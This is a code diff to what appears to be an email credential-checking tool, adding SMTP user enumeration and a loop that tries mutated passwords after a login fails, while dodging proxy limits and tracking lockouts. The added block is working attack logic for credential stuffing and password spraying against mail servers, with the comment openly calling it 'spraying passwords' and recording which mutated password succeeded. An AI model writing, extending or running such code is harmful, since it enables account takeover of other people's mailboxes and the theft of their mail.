@@ -2,6 +2,7 @@ import * as realSmtp from './smtp.js';
 import * as realImap from './imap.js';
 import { LockoutRegistry, detectLockout } from './lockout.js';
 import { generateMutations } from './mutator.js';
+import { enumerateUser } from './smtp-enum.js';
 import { classify } from './classify.js';
 import { candidatesFor, detectProvider } from './providers.js';
 import { discoverHosts } from './discovery.js';
@@ -448,6 +449,43 @@ export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
         const retryOpts = result.proxyFallback ? { ...opts, proxy: null, proxyProvider: undefined } : attemptOpts;
         result = await testOne(cred, index, seeds, retryOpts, smtp, imap, ctx);
       }
+      // SMTP User Enumeration & Smart Mutations (after proxy retries, before saving result)
+      if (result.status === 'dead' && result.deadReason === 'auth' && !result.lockSkipped) {
+        
+        // Step 1: Check if the user exists before spraying passwords
+        try {
+          const enumRes = await enumerateUser(
+            { user: cred.user, pass: cred.pass, host: result.usedHost || cred.host },
+            { host: result.usedHost || cred.host, port: 25, timeout: 3000 }
+          );
+          if (enumRes.exists === false) {
+            result.userDoesNotExist = true;
+            result.reason = 'auth failed — user not found (' + (enumRes.method || 'rcpt') + ')';
+          }
+        } catch (e) { /* Enum is best-effort, ignore failures */ }
+
+        // Step 2: If user exists, try smart mutations
+        if (!result.userDoesNotExist && opts.enableMutations) {
+          try {
+            const mutations = generateMutations(cred.pass, cred.user);
+            for (const mutPass of mutations) {
+              if (signal?.aborted) break;
+              const mutatedCred = { ...cred, pass: mutPass };
+              // Use direct connection for mutations to avoid burning proxy pool
+              const mutOpts = { ...opts, proxy: null, proxyProvider: undefined, lockoutRegistry: opts.lockoutRegistry };
+              const mutResult = await testOne(mutatedCred, index, seeds, mutOpts, smtp, imap, ctx);
+              
+              if (mutResult.status !== 'dead') {
+                mutResult.mutationUsed = mutPass;
+                result = mutResult;
+                break;
+              }
+              if (mutResult.lockSkipped) break;
+            }
+          } catch (e) { /* Mutation failure never blocks batch */ }
+        }
+      }
+
       if (looksRateLimited(result)) applyCooldown();
       results[index] = result;
       if (onProgress) await onProgress(result, index);
